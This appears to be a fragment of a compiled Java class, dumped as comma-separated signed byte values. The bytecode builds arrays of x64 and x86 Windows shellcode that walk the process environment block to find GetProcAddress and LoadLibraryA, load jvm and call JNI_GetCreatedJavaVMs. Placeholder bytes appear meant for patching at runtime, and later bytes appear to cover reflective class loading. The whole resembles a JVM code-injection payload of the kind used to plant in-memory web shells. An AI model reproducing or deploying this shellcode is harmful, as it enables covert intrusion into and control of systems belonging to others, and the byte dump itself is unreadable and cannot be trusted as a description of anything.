89, 6, 16, 40, 84, 89, 7, 16, 72, 84, 89, 8, 16, -125, 84, 89, 16, 6, 16, -28, 84, 89, 16, 7, 16, -16, 84, 89, 16, 8, 16, 72, 84, 89, 16, 9, 16, 49, 84, 89, 16, 10, 16, -55, 84, 89, 16, 11, 16, 101, 84, 89, 16, 12, 16, 72, 84, 89, 16, 13, 16, -117, 84, 89, 16, 14, 16, 65, 84, 89, 16, 15, 16, 96, 84, 89, 16, 16, 16, 72, 84, 89, 16, 17, 16, -117, 84, 89, 16, 18, 16, 64, 84, 89, 16, 19, 16, 24, 84, 89, 16, 20, 16, 72, 84, 89, 16, 21, 16, -117, 84, 89, 16, 22, 16, 112, 84, 89, 16, 23, 16, 32, 84, 89, 16, 24, 16, 72, 84, 89, 16, 25, 16, -83, 84, 89, 16, 26, 16, 72, 84, 89, 16, 27, 16, -106, 84, 89, 16, 28, 16, 72, 84, 89, 16, 29, 16, -83, 84, 89, 16, 30, 16, 72, 84, 89, 16, 31, 16, -117, 84, 89, 16, 32, 16, 88, 84, 89, 16, 33, 16, 32, 84, 89, 16, 34, 16, 77, 84, 89, 16, 35, 16, 49, 84, 89, 16, 36, 16, -64, 84, 89, 16, 37, 16, 68, 84, 89, 16, 38, 16, -117, 84, 89, 16, 39, 16, 67, 84, 89, 16, 40, 16, 60, 84, 89, 16, 41, 16, 76, 84, 89, 16, 42, 16, -119, 84, 89, 16, 43, 16, -62, 84, 89, 16, 44, 16, 72, 84, 89, 16, 45, 4, 84, 89, 16, 46, 16, -38, 84, 89, 16, 47, 16, 68, 84, 89, 16, 48, 16, -117, 84, 89, 16, 49, 16, -126, 84, 89, 16, 50, 16, -120, 84, 89, 16, 54, 16, 73, 84, 89, 16, 55, 4, 84, 89, 16, 56, 16, -40, 84, 89, 16, 57, 16, 72, 84, 89, 16, 58, 16, 49, 84, 89, 16, 59, 16, -10, 84, 89, 16, 60, 16, 65, 84, 89, 16, 61, 16, -117, 84, 89, 16, 62, 16, 112, 84, 89, 16, 63, 16, 32, 84, 89, 16, 64, 16, 72, 84, 89, 16, 65, 4, 84, 89, 16, 66, 16, -34, 84, 89, 16, 67, 16, 72, 84, 89, 16, 68, 16, 49, 84, 89, 16, 69, 16, -55, 84, 89, 16, 70, 16, 73, 84, 89, 16, 71, 16, -71, 84, 89, 16, 72, 16, 71, 84, 89, 16, 73, 16, 101, 84, 89, 16, 74, 16, 116, 84, 89, 16, 75, 16, 80, 84, 89, 16, 76, 16, 114, 84, 89, 16, 77, 16, 111, 84, 89, 16, 78, 16, 99, 84, 89, 16, 79, 16, 65, 84, 89, 16, 80, 16, 72, 84, 89, 16, 81, 2, 84, 89, 16, 82, 16, -63, 84, 89, 16, 83, 16, 72, 84, 89, 16, 84, 16, 49, 84, 89, 16, 85, 16, -64, 84, 89, 16, 86, 16, -117, 84, 89, 16, 87, 7, 84, 89, 16, 88, 16, -114, 84, 89, 16, 89, 16, 72, 84, 89, 16, 90, 4, 84, 89, 16, 91, 16, -40, 84, 89, 16, 92, 16, 76, 84, 89, 16, 93, 16, 57, 84, 89, 16, 94, 16, 8, 84, 89, 16, 95, 16, 117, 84, 89, 16, 96, 16, -17, 84, 89, 16, 97, 16, 72, 84, 89, 16, 98, 16, 49, 84, 89, 16, 99, 16, -10, 84, 89, 16, 100, 16, 65, 84, 89, 16, 101, 16, -117, 84, 89, 16, 102, 16, 112, 84, 89, 16, 103, 16, 36, 84, 89, 16, 104, 16, 72, 84, 89, 16, 105, 4, 84, 89, 16, 106, 16, -34, 84, 89, 16, 107, 16, 102, 84, 89, 16, 108, 16, -117, 84, 89, 16, 109, 16, 12, 84, 89, 16, 110, 16, 78, 84, 89, 16, 111, 16, 72, 84, 89, 16, 112, 16, 49, 84, 89, 16, 113, 16, -10, 84, 89, 16, 114, 16, 65, 84, 89, 16, 115, 16, -117, 84, 89, 16, 116, 16, 112, 84, 89, 16, 117, 16, 28, 84, 89, 16, 118, 16, 72, 84, 89, 16, 119, 4, 84, 89, 16, 120, 16, -34, 84, 89, 16, 121, 16, 72, 84, 89, 16, 122, 16, 49, 84, 89, 16, 123, 16, -46, 84, 89, 16, 124, 16, -117, 84, 89, 16, 125, 16, 20, 84, 89, 16, 126, 16, -114, 84, 89, 16, 127, 16, 72, 84, 89, 17, 0, -128, 4, 84, 89, 17, 0, -127, 16, -38, 84, 89, 17, 0, -126, 16, 72, 84, 89, 17, 0, -125, 16, -119, 84, 89, 17, 0, -124, 16, -41, 84, 89, 17, 0, -123, 16, -71, 84, 89, 17, 0, -122, 16, 97, 84, 89, 17, 0, -121, 16, 114, 84, 89, 17, 0, -120, 16, 121, 84, 89, 17, 0, -119, 16, 65, 84, 89, 17, 0, -118, 16, 81, 84, 89, 17, 0, -117, 16, 72, 84, 89, 17, 0, -116, 16, -71, 84, 89, 17, 0, -115, 16, 76, 84, 89, 17, 0, -114, 16, 111, 84, 89, 17, 0, -113, 16, 97, 84, 89, 17, 0, -112, 16, 100, 84, 89, 17, 0, -111, 16, 76, 84, 89, 17, 0, -110, 16, 105, 84, 89, 17, 0, -109, 16, 98, 84, 89, 17, 0, -108, 16, 114, 84, 89, 17, 0, -107, 16, 81, 84, 89, 17, 0, -106, 16, 72, 84, 89, 17, 0, -105, 16, -119, 84, 89, 17, 0, -104, 16, -30, 84, 89, 17, 0, -103, 16, 72, 84, 89, 17, 0, -102, 16, -119, 84, 89, 17, 0, -101, 16, -39, 84, 89, 17, 0, -100, 16, 72, 84, 89, 17, 0, -99, 16, -125, 84, 89, 17, 0, -98, 16, -20, 84, 89, 17, 0, -97, 16, 48, 84, 89, 17, 0, -96, 2, 84, 89, 17, 0, -95, 16, -41, 84, 89, 17, 0, -94, 16, 72, 84, 89, 17, 0, -93, 16, -125, 84, 89, 17, 0, -92, 16, -60, 84, 89, 17, 0, -91, 16, 48, 84, 89, 17, 0, -90, 16, 72, 84, 89, 17, 0, -89, 16, -125, 84, 89, 17, 0, -88, 16, -60, 84, 89, 17, 0, -87, 16, 16, 84, 89, 17, 0, -86, 16, 72, 84, 89, 17, 0, -85, 16, -119, 84, 89, 17, 0, -84, 16, -58, 84, 89, 17, 0, -83, 16, -71, 84, 89, 17, 0, -82, 16, 108, 84, 89, 17, 0, -81, 16, 108, 84, 89, 17, 0, -78, 16, 81, 84, 89, 17, 0, -77, 16, -71, 84, 89, 17, 0, -76, 16, 106, 84, 89, 17, 0, -75, 16, 118, 84, 89, 17, 0, -74, 16, 109, 84, 89, 17, 0, -72, 16, 81, 84, 89, 17, 0, -71, 16, 72, 84, 89, 17, 0, -70, 16, -119, 84, 89, 17, 0, -69, 16, -31, 84, 89, 17, 0, -68, 16, 72, 84, 89, 17, 0, -67, 16, -125, 84, 89, 17, 0, -66, 16, -20, 84, 89, 17, 0, -65, 16, 48, 84, 89, 17, 0, -64, 2, 84, 89, 17, 0, -63, 16, -42, 84, 89, 17, 0, -62, 16, 72, 84, 89, 17, 0, -61, 16, -125, 84, 89, 17, 0, -60, 16, -60, 84, 89, 17, 0, -59, 16, 48, 84, 89, 17, 0, -58, 16, 72, 84, 89, 17, 0, -57, 16, -125, 84, 89, 17, 0, -56, 16, -60, 84, 89, 17, 0, -55, 16, 16, 84, 89, 17, 0, -54, 16, 73, 84, 89, 17, 0, -53, 16, -119, 84, 89, 17, 0, -52, 16, -57, 84, 89, 17, 0, -51, 16, 72, 84, 89, 17, 0, -50, 16, 49, 84, 89, 17, 0, -49, 16, -55, 84, 89, 17, 0, -48, 16, 72, 84, 89, 17, 0, -47, 16, -71, 84, 89, 17, 0, -46, 16, 118, 84, 89, 17, 0, -45, 16, 97, 84, 89, 17, 0, -44, 16, 86, 84, 89, 17, 0, -43, 16, 77, 84, 89, 17, 0, -42, 16, 115, 84, 89, 17, 0, -38, 16, 81, 84, 89, 17, 0, -37, 16, 72, 84, 89, 17, 0, -36, 16, -71, 84, 89, 17, 0, -35, 16, 114, 84, 89, 17, 0, -34, 16, 101, 84, 89, 17, 0, -33, 16, 97, 84, 89, 17, 0, -32, 16, 116, 84, 89, 17, 0, -31, 16, 101, 84, 89, 17, 0, -30, 16, 100, 84, 89, 17, 0, -29, 16, 74, 84, 89, 17, 0, -28, 16, 97, 84, 89, 17, 0, -27, 16, 81, 84, 89, 17, 0, -26, 16, 72, 84, 89, 17, 0, -25, 16, -71, 84, 89, 17, 0, -24, 16, 74, 84, 89, 17, 0, -23, 16, 78, 84, 89, 17, 0, -22, 16, 73, 84, 89, 17, 0, -21, 16, 95, 84, 89, 17, 0, -20, 16, 71, 84, 89, 17, 0, -19, 16, 101, 84, 89, 17, 0, -18, 16, 116, 84, 89, 17, 0, -17, 16, 67, 84, 89, 17, 0, -16, 16, 81, 84, 89, 17, 0, -15, 16, 72, 84, 89, 17, 0, -14, 16, -119, 84, 89, 17, 0, -13, 16, -30, 84, 89, 17, 0, -12, 16, 76, 84, 89, 17, 0, -11, 16, -119, 84, 89, 17, 0, -10, 16, -7, 84, 89, 17, 0, -9, 16, 72, 84, 89, 17, 0, -8, 16, -125, 84, 89, 17, 0, -7, 16, -20, 84, 89, 17, 0, -6, 16, 40, 84, 89, 17, 0, -5, 2, 84, 89, 17, 0, -4, 16, -41, 84, 89, 17, 0, -3, 16, 72, 84, 89, 17, 0, -2, 16, -125, 84, 89, 17, 0, -1, 16, -60, 84, 89, 17, 1, 0, 16, 40, 84, 89, 17, 1, 1, 16, 72, 84, 89, 17, 1, 2, 16, -125, 84, 89, 17, 1, 3, 16, -60, 84, 89, 17, 1, 4, 16, 24, 84, 89, 17, 1, 5, 16, 73, 84, 89, 17, 1, 6, 16, -119, 84, 89, 17, 1, 7, 16, -57, 84, 89, 17, 1, 8, 16, 72, 84, 89, 17, 1, 9, 16, -125, 84, 89, 17, 1, 10, 16, -20, 84, 89, 17, 1, 11, 16, 40, 84, 89, 17, 1, 12, 16, 72, 84, 89, 17, 1, 13, 16, -119, 84, 89, 17, 1, 14, 16, -31, 84, 89, 17, 1, 15, 16, -70, 84, 89, 17, 1, 16, 4, 84, 89, 17, 1, 20, 16, 73, 84, 89, 17, 1, 21, 16, -119, 84, 89, 17, 1, 22, 16, -56, 84, 89, 17, 1, 23, 16, 73, 84, 89, 17, 1, 24, 16, -125, 84, 89, 17, 1, 25, 16, -64, 84, 89, 17, 1, 26, 16, 8, 84, 89, 17, 1, 27, 16, 72, 84, 89, 17, 1, 28, 16, -125, 84, 89, 17, 1, 29, 16, -20, 84, 89, 17, 1, 30, 16, 40, 84, 89, 17, 1, 31, 16, 65, 84, 89, 17, 1, 32, 2, 84, 89, 17, 1, 33, 16, -41, 84, 89, 17, 1, 34, 16, 72, 84, 89, 17, 1, 35, 16, -125, 84, 89, 17, 1, 36, 16, -60, 84, 89, 17, 1, 37, 16, 40, 84, 89, 17, 1, 38, 16, 72, 84, 89, 17, 1, 39, 16, -117, 84, 89, 17, 1, 40, 16, 9, 84, 89, 17, 1, 41, 16, 72, 84, 89, 17, 1, 42, 16, -125, 84, 89, 17, 1, 43, 16, -20, 84, 89, 17, 1, 44, 16, 32, 84, 89, 17, 1, 45, 16, 84, 84, 89, 17, 1, 46, 16, 72, 84, 89, 17, 1, 47, 16, -119, 84, 89, 17, 1, 48, 16, -30, 84, 89, 17, 1, 49, 16, 77, 84, 89, 17, 1, 50, 16, 49, 84, 89, 17, 1, 51, 16, -64, 84, 89, 17, 1, 52, 16, 76, 84, 89, 17, 1, 53, 16, -117, 84, 89, 17, 1, 54, 16, 57, 84, 89, 17, 1, 55, 16, 77, 84, 89, 17, 1, 56, 16, -117, 84, 89, 17, 1, 57, 16, 127, 84, 89, 17, 1, 58, 16, 32, 84, 89, 17, 1, 59, 16, 73, 84, 89, 17, 1, 60, 16, -119, 84, 89, 17, 1, 61, 16, -50, 84, 89, 17, 1, 62, 16, 65, 84, 89, 17, 1, 63, 2, 84, 89, 17, 1, 64, 16, -41, 84, 89, 17, 1, 65, 16, 76, 84, 89, 17, 1, 66, 16, -119, 84, 89, 17, 1, 67, 16, -15, 84, 89, 17, 1, 68, 16, 72, 84, 89, 17, 1, 69, 16, -70, 84, 89, 17, 1, 70, 16, 72, 84, 89, 17, 1, 71, 16, 71, 84, 89, 17, 1, 72, 16, 70, 84, 89, 17, 1, 73, 16, 69, 84, 89, 17, 1, 74, 16, 68, 84, 89, 17, 1, 75, 16, 67, 84, 89, 17, 1, 76, 16, 66, 84, 89, 17, 1, 77, 16, 65, 84, 89, 17, 1, 78, 16, 65, 84, 89, 17, 1, 79, 16, -72, 84, 89, 17, 1, 81, 5, 84, 89, 17, 1, 82, 4, 84, 89, 17, 1, 83, 16, 48, 84, 89, 17, 1, 84, 16, 77, 84, 89, 17, 1, 85, 16, -117, 84, 89, 17, 1, 86, 16, 62, 84, 89, 17, 1, 87, 16, 77, 84, 89, 17, 1, 88, 16, -117, 84, 89, 17, 1, 89, 16, 127, 84, 89, 17, 1, 90, 16, 48, 84, 89, 17, 1, 91, 16, 72, 84, 89, 17, 1, 92, 16, -125, 84, 89, 17, 1, 93, 16, -20, 84, 89, 17, 1, 94, 16, 32, 84, 89, 17, 1, 95, 16, 65, 84, 89, 17, 1, 96, 2, 84, 89, 17, 1, 97, 16, -41, 84, 89, 17, 1, 98, 16, 72, 84, 89, 17, 1, 99, 16, -125, 84, 89, 17, 1, 100, 16, -60, 84, 89, 17, 1, 101, 16, 32, 84, 89, 17, 1, 102, 16, 76, 84, 89, 17, 1, 103, 16, -119, 84, 89, 17, 1, 104, 16, -15, 84, 89, 17, 1, 105, 16, 77, 84, 89, 17, 1, 106, 16, -117, 84, 89, 17, 1, 107, 16, 62, 84, 89, 17, 1, 108, 16, 77, 84, 89, 17, 1, 109, 16, -117, 84, 89, 17, 1, 110, 16, 127, 84, 89, 17, 1, 111, 16, 40, 84, 89, 17, 1, 112, 16, 65, 84, 89, 17, 1, 113, 2, 84, 89, 17, 1, 114, 16, -41, 84, 89, 17, 1, 115, 16, 72, 84, 89, 17, 1, 116, 16, -125, 84, 89, 17, 1, 117, 16, -60, 84, 89, 17, 1, 118, 16, 120, 84, 89, 17, 1, 119, 16, -61, 84, 78, 16, 8, -68, 8, 89, 3, 16, 72, 84, 89, 4, 16, 71, 84, 89, 5, 16, 70, 84, 89, 6, 16, 69, 84, 89, 7, 16, 68, 84, 89, 8, 16, 67, 84, 89, 16, 6, 16, 66, 84, 89, 16, 7, 16, 65, 84, 58, 4, -78, 0, 14, 7, -96, 6, 0, 17, 0, -13, -68, 8, 89, 3, 16, -112, 84, 89, 4, 16, -112, 84, 89, 5, 16, -112, 84, 89, 6, 16, 51, 84, 89, 7, 16, -55, 84, 89, 8, 16, 100, 84, 89, 16, 6, 16, -95, 84, 89, 16, 7, 16, 48, 84, 89, 16, 11, 16, -117, 84, 89, 16, 12, 16, 64, 84, 89, 16, 13, 16, 12, 84, 89, 16, 14, 16, -117, 84, 89, 16, 15, 16, 112, 84, 89, 16, 16, 16, 20, 84, 89, 16, 17, 16, -83, 84, 89, 16, 18, 16, -106, 84, 89, 16, 19, 16, -83, 84, 89, 16, 20, 16, -117, 84, 89, 16, 21, 16, 88, 84, 89, 16, 22, 16, 16, 84, 89, 16, 23, 16, -117, 84, 89, 16, 24, 16, 83, 84, 89, 16, 25, 16, 60, 84, 89, 16, 26, 6, 84, 89, 16, 27, 16, -45, 84, 89, 16, 28, 16, -117, 84, 89, 16, 29, 16, 82, 84, 89, 16, 30, 16, 120, 84, 89, 16, 31, 6, 84, 89, 16, 32, 16, -45, 84, 89, 16, 33, 16, 51, 84, 89, 16, 34, 16, -55, 84, 89, 16, 35, 16, -117, 84, 89, 16, 36, 16, 114, 84, 89, 16, 37, 16, 32, 84, 89, 16, 38, 6, 84, 89, 16, 39, 16, -13, 84, 89, 16, 40, 16, 65, 84, 89, 16, 41, 16, -83, 84, 89, 16, 42, 6, 84, 89, 16, 43, 16, -61, 84, 89, 16, 44, 16, -127, 84, 89, 16, 45, 16, 56, 84, 89, 16, 46, 16, 71, 84, 89, 16, 47, 16, 101, 84, 89, 16, 48, 16, 116, 84, 89, 16, 49, 16, 80, 84, 89, 16, 50, 16, 117, 84, 89, 16, 51, 16, -12, 84, 89, 16, 52, 16, -127, 84, 89, 16, 53, 16, 120, 84, 89, 16, 54, 7, 84, 89, 16, 55, 16, 114, 84, 89, 16, 56, 16, 111, 84, 89, 16, 57, 16, 99, 84, 89, 16, 58, 16, 65, 84, 89, 16, 59, 16, 117, 84, 89, 16, 60, 16, -21, 84, 89, 16, 61, 16, -127, 84, 89, 16, 62, 16, 120, 84, 89, 16, 63, 16, 8, 84, 89, 16, 64, 16, 100, 84, 89, 16, 65, 16, 100, 84, 89, 16, 66, 16, 114, 84, 89, 16, 67, 16, 101, 84, 89, 16, 68, 16, 117, 84, 89, 16, 69, 16, -30, 84, 89, 16, 70, 16, -117, 84, 89, 16, 71, 16, 114, 84, 89, 16, 72, 16, 36, 84, 89, 16, 73, 6, 84, 89, 16, 74, 16, -13, 84, 89, 16, 75, 16, 102, 84, 89, 16, 76, 16, -117, 84, 89, 16, 77, 16, 12, 84, 89, 16, 78, 16, 78, 84, 89, 16, 79, 16, 73, 84, 89, 16, 80, 16, -117, 84, 89, 16, 81, 16, 114, 84, 89, 16, 82, 16, 28, 84, 89, 16, 83, 6, 84, 89, 16, 84, 16, -13, 84, 89, 16, 85, 16, -117, 84, 89, 16, 86, 16, 20, 84, 89, 16, 87, 16, -114, 84, 89, 16, 88, 6, 84, 89, 16, 89, 16, -45, 84, 89, 16, 90, 16, 82, 84, 89, 16, 91, 16, 51, 84, 89, 16, 92, 16, -55, 84, 89, 16, 93, 16, 81, 84, 89, 16, 94, 16, 104, 84, 89, 16, 95, 16, 97, 84, 89, 16, 96, 16, 114, 84, 89, 16, 97, 16, 121, 84, 89, 16, 98, 16, 65, 84, 89, 16, 99, 16, 104, 84, 89, 16, 100, 16, 76, 84, 89, 16, 101, 16, 105, 84, 89, 16, 102, 16, 98, 84, 89, 16, 103, 16, 114, 84, 89, 16, 104, 16, 104, 84, 89, 16, 105, 16, 76, 84, 89, 16, 106, 16, 111, 84, 89, 16, 107, 16, 97, 84, 89, 16, 108, 16, 100, 84, 89, 16, 109, 16, 84, 84, 89, 16, 110, 16, 83, 84, 89, 16, 111, 2, 84, 89, 16, 112, 16, -46, 84, 89, 16, 113, 16, -125, 84, 89, 16, 114, 16, -60, 84, 89, 16, 115, 16, 12, 84, 89, 16, 116, 16, 89, 84, 89, 16, 117, 16, 80, 84, 89, 16, 118, 16, 102, 84, 89, 16, 119, 16, -71, 84, 89, 16, 120, 16, 51, 84, 89, 16, 121, 16, 50, 84, 89, 16, 122, 16, 81, 84, 89, 16, 123, 16, 104, 84, 89, 16, 124, 16, 106, 84, 89, 16, 125, 16, 118, 84, 89, 16, 126, 16, 109, 84, 89, 17, 0, -128, 16, 84, 84, 89, 17, 0, -127, 2, 84, 89, 17, 0, -126, 16, -48, 84, 89, 17, 0, -125, 16, -117, 84, 89, 17, 0, -124, 16, -40, 84, 89, 17, 0, -123, 16, -125, 84, 89, 17, 0, -122, 16, -60, 84, 89, 17, 0, -121, 16, 12, 84, 89, 17, 0, -120, 16, 90, 84, 89, 17, 0, -119, 16, 51, 84, 89, 17, 0, -118, 16, -55, 84, 89, 17, 0, -117, 16, 81, 84, 89, 17, 0, -116, 16, 106, 84, 89, 17, 0, -115, 16, 115, 84, 89, 17, 0, -114, 16, 104, 84, 89, 17, 0, -113, 16, 118, 84, 89, 17, 0, -112, 16, 97, 84, 89, 17, 0, -111, 16, 86, 84, 89, 17, 0, -110, 16, 77, 84, 89, 17, 0, -109, 16, 104, 84, 89, 17, 0, -108, 16, 101, 84, 89, 17, 0, -107, 16, 100, 84, 89, 17, 0, -106, 16, 74, 84, 89, 17, 0, -105, 16, 97, 84, 89, 17, 0, -104, 16, 104, 84, 89, 17, 0, -103, 16, 114, 84, 89, 17, 0, -102, 16, 101, 84, 89, 17, 0, -101, 16, 97, 84, 89, 17, 0, -100, 16, 116, 84, 89, 17, 0, -99, 16, 104, 84, 89, 17, 0, -98, 16, 71, 84, 89, 17, 0, -97, 16, 101, 84, 89, 17, 0, -96, 16, 116, 84, 89, 17, 0, -95, 16, 67, 84, 89, 17, 0, -94, 16, 104, 84, 89, 17, 0, -93, 16, 74, 84, 89, 17, 0, -92, 16, 78, 84, 89, 17, 0, -91, 16, 73, 84, 89, 17, 0, -90, 16, 95, 84, 89, 17, 0, -89, 16, 84, 84, 89, 17, 0, -88, 16, 83, 84, 89, 17, 0, -87, 2, 84, 89, 17, 0, -86, 16, -46, 84, 89, 17, 0, -85, 16, -119, 84, 89, 17, 0, -84, 16, 69, 84, 89, 17, 0, -83, 16, -16, 84, 89, 17, 0, -82, 16, 84, 84, 89, 17, 0, -81, 16, 106, 84, 89, 17, 0, -80, 4, 84, 89, 17, 0, -79, 16, 84, 84, 89, 17, 0, -78, 16, 89, 84, 89, 17, 0, -77, 16, -125, 84, 89, 17, 0, -76, 16, -63, 84, 89, 17, 0, -75, 16, 16, 84, 89, 17, 0, -74, 16, 81, 84, 89, 17, 0, -73, 16, 84, 84, 89, 17, 0, -72, 16, 89, 84, 89, 17, 0, -71, 16, 106, 84, 89, 17, 0, -70, 4, 84, 89, 17, 0, -69, 16, 81, 84, 89, 17, 0, -68, 2, 84, 89, 17, 0, -67, 16, -48, 84, 89, 17, 0, -66, 16, -117, 84, 89, 17, 0, -65, 16, -63, 84, 89, 17, 0, -64, 16, -125, 84, 89, 17, 0, -63, 16, -20, 84, 89, 17, 0, -62, 16, 48, 84, 89, 17, 0, -61, 16, 106, 84, 89, 17, 0, -59, 16, 84, 84, 89, 17, 0, -58, 16, 89, 84, 89, 17, 0, -57, 16, -125, 84, 89, 17, 0, -56, 16, -63, 84, 89, 17, 0, -55, 16, 16, 84, 89, 17, 0, -54, 16, 81, 84, 89, 17, 0, -53, 16, -117, 84, 89, 17, 0, -51, 16, 80, 84, 89, 17, 0, -50, 16, -117, 84, 89, 17, 0, -49, 16, 24, 84, 89, 17, 0, -48, 16, -117, 84, 89, 17, 0, -47, 16, 67, 84, 89, 17, 0, -46, 16, 16, 84, 89, 17, 0, -45, 2, 84, 89, 17, 0, -44, 16, -48, 84, 89, 17, 0, -43, 16, -117, 84, 89, 17, 0, -42, 16, 67, 84, 89, 17, 0, -41, 16, 24, 84, 89, 17, 0, -40, 16, 104, 84, 89, 17, 0, -38, 5, 84, 89, 17, 0, -37, 4, 84, 89, 17, 0, -36, 16, 48, 84, 89, 17, 0, -35, 16, 104, 84, 89, 17, 0, -34, 16, 68, 84, 89, 17, 0, -33, 16, 67, 84, 89, 17, 0, -32, 16, 66, 84, 89, 17, 0, -31, 16, 65, 84, 89, 17, 0, -30, 16, -125, 84, 89, 17, 0, -29, 16, -20, 84, 89, 17, 0, -28, 7, 84, 89, 17, 0, -27, 2, 84, 89, 17, 0, -26, 16, -48, 84, 89, 17, 0, -25, 16, -125, 84, 89, 17, 0, -24, 16, -20, 84, 89, 17, 0, -23, 16, 12, 84, 89, 17, 0, -22, 16, -117, 84, 89, 17, 0, -21, 16, 67, 84, 89, 17, 0, -20, 16, 20, 84, 89, 17, 0, -19, 2, 84, 89, 17, 0, -18, 16, -48, 84, 89, 17, 0, -17, 16, -125, 84, 89, 17, 0, -16, 16, -60, 84, 89, 17, 0, -15, 16, 92, 84, 89, 17, 0, -14, 16, -61, 84, 78, 7, -68, 8, 89, 3, 16, 68, 84, 89, 4, 16, 67, 84, 89, 5, 16, 66, 84, 89, 6, 16, 65, 84, 58, 4, 45, 25, 4, 31, -78, 0, 14, -123, 97, -78, 0, 14, -72, 0, 62, -72, 0, 66, 78, -78, 0, 70, 16, 7, 16, 50, 84, 18, 72, -72, 0, 74, 20, 0, 80, 45, 18, 82, 18, 82, 3, -67, 0, 3, -72, 0, 83, -89, 0, 11, 58, 5, 25, 5, -74, 0, 85, -79, 42, 31, -78, 0, 14, -123, 97, -74, 0, 88, 55, 5, -78, 0, 14, 7, -96, 0, 17, 42, 22, 5, 20, 0, 91, 97, 5, -74, 0, 93, -89, 0, 14, 42, 22, 5, 20, 0, 97, 97, 5, -74, 0, 93, 18, 99, -72, 0, 101, 58, 7, 25, 7, 6, -67, 0, 36, 89, 3, -78, 0, 105, 83, 89, 4, -78, 0, 111, 83, 89, 5, -78, 0, 111, 83, -74, 0, 114, 58, 8, 25, 8, 4, -74, 0, 118, 25, 8, 6, -67, 0, 3, 89, 3, 31, -72, 0, 121, 83, 89, 4, 4, -72, 0, 125, 83, 89, 5, 3, -72, 0, 125, 83, -74, 0, -128, 58, 9, -69, 0, -124, 89, -78, 0, -122, -72, 0, 101, -78, 0, 70, -73, 0, -120, 58, 10, 25, 7, 18, -117, 4, -67, 0, 36, 89, 3, 18, -115, 83, -74, 0, -113, 58, 11, 25, 11, 25, 9, 4, -67, 0, 3, 89, 3, 4, -67, 0, -124, 89, 3, 25, 10, 83, 83, -74, 0, -109, 87, -89, 0, 13, 58, 7, 25, 7, -74, 0, -103, 25, 7, -65, -79, 0, 3, 0, 2, 0, 24, 0, 27, 0, 29, 15, -39, 15, -19, 15, -16, 0, 29, 16, 36, 16, -86, 16, -83, 0, -102, 0, 4, 0, 16, 0, 0, 0, -98, 0, 39, 0, 0, 0, 29, 0, 2, 0, 31, 0, 10, 0, 32, 0, 15, 0, 33, 0, 24, 0, 34, 0, 28, 0, 35, 0, 37, 0, 38, 0, 45, 0, 41, 9, -118, 0, 42, 9, -70, 0, 43, 9, -63, 0, 44, 15, -91, 0, 45, 15, -66, 0, 47, 15, -47, 0, 48, 15, -39, 0, 50, 15, -34, 0, 51, 15, -19, 0, 52, 15, -14, 0, 53, 15, -9, 0, 54, 15, -8, 0, 56, 16, 4, 0, 57, 16, 11, 0, 59, 16, 22, 0, 60, 16, 25, 0, 63, 16, 36, 0, 66, 16, 43, 0, 67, 16, 72, 0, 68, 16, 78, 0, 69, 16, 110, 0, 71, 16, -128, 0, 72, 16, -110, 0, 73, 16, -100, 0, 74, 16, -94, 0, 75, 16, -90, 0, 73, 16, -86, 0, 78, 16, -83, 0, 79, 16, -81, 0, 81, 16, -76, 0, 82, 16, -73, 0, 85, 0, 17, 0, 0, 0, -114, 0, 14, 0, 2, 16, -74, 0, -100, 0, -99, 0, 0, 0, 10, 0, 14, 0, -98, 0, -97, 0, 1, 0, 28, 0, 9, 0, -96, 0, -95, 0, 1, 0, 45, 16, -117, 0, -94, 0, -93, 0, 1, 9, -118, 7, 46, 0, -92, 0, 10, 0, 3, 9, -70, 6, -2, 0, -91, 0, 10, 0, 4, 15, -14, 0, 6, 0, -96, 0, -95, 0, 5, 16, 4, 0, -76, 0, -90, 0, -93, 0, 5, 16, 43, 0, 127, 0, -89, 0, 110, 0, 7, 16, 72, 0, 98, 0, -88, 0, -87, 0, 8, 16, 110, 0, 60, 0, -86, 0, -85, 0, 9, 16, -128, 0, 42, 0, -84, 0, -83, 0, 10, 16, -110, 0, 24, 0, -82, 0, -81, 0, 11, 16, -81, 0, 8, 0, -80, 0, -79, 0, 7, 0, -78, 0, 0, 0, 22, 0, 2, 16, 43, 0, 127, 0, -89, 0, -77, 0, 7, 16, 72, 0, 98, 0, -88, 0, -76, 0, 8, 0, -75, 0, 0, 0, 43, 0, 9, -1, 0, 27, 0, 1, 7, 0, 31, 0, 1, 7, 0, 29, 9, -2, 15, -104, 4, 7, 0, -74, 7, 0, -74, 113, 7, 0, 29, 7, -4, 0, 32, 4, 10, -9, 0, -120, 7, 0, -102, 9, 0, 9, 0, 64, 0, 65, 0, 1, 0, 13, 0, 0, 0, -117, 0, 6, 0, 5, 0, 0, 0, 35, 28, -68, 8, 78, 3, 54, 4, -89, 0, 19, 45, 21, 4, 30, 21, 4, 16, 8, 104, 123, -120, -111, 84, -124, 4, 1, 21, 4, 45, -66, -95, -1, -20, 45, -80, 0, 0, 0, 3, 0, 16, 0, 0, 0, 22, 0, 5, 0, 0, 0, 91, 0, 4, 0, 93, 0, 10, 0, 94, 0, 23, 0, 93, 0, 33, 0, 96, 0, 17, 0, 0, 0, 42, 0, 4, 0, 0, 0, 35, 0, -73, 0, -93, 0, 0, 0, 0, 0, 35, 0, -72, 0, 6, 0, 2, 0, 4, 0, 31, 0, -71, 0, 10, 0, 3, 0, 7, 0, 26, 0, -70, 0, 6, 0, 4, 0, -75, 0, 0, 0, 10, 0, 2, -3, 0, 10, 7, 0, -74, 1, 15, 0, 10, 0, 68, 0, 69, 0, 1, 0, 13, 0, 0, 0, -30, 0, 5, 0, 6, 0, 0, 0, 74, 3, 62, -89, 0, 64, 4, 54, 4, 3, 54, 5, -89, 0, 31, 29, 21, 5, 96, 42, -66, -94, 0, 16, 42, 29, 21, 5, 96, 51, 43, 21, 5, 51, -97, 0, 6, 3, 54, 4, -124, 5, 1, 21, 5, 43, -66, -95, -1, -32, 21, 4, -103, 0, 12, 44, 3, 42, 29, 44, -66, -72, 0, -69, -124, 3, 1, 29, 42, -66, -95, -1, -64, 42, -80, 0, 0, 0, 3, 0, 16, 0, 0, 0, 42, 0, 10, 0, 0, 0, 102, 0, 5, 0, 104, 0, 8, 0, 105, 0, 14, 0, 107, 0, 36, 0, 112, 0, 39, 0, 105, 0, 49, 0, 115, 0, 54, 0, 117, 0, 63, 0, 102, 0, 72, 0, 120, 0, 17, 0, 0, 0, 62, 0, 6, 0, 0, 0, 74, 0, -65, 0, 10, 0, 0, 0, 0, 0, 74, 0, -64, 0, 10, 0, 1, 0, 0, 0, 74, 0, -63, 0, 10, 0, 2, 0, 2, 0, 70, 0, -70, 0, 6, 0, 3, 0, 8, 0, 55, 0, -62, 0, -61, 0, 4, 0, 11, 0, 38, 0, -60, 0, 6, 0, 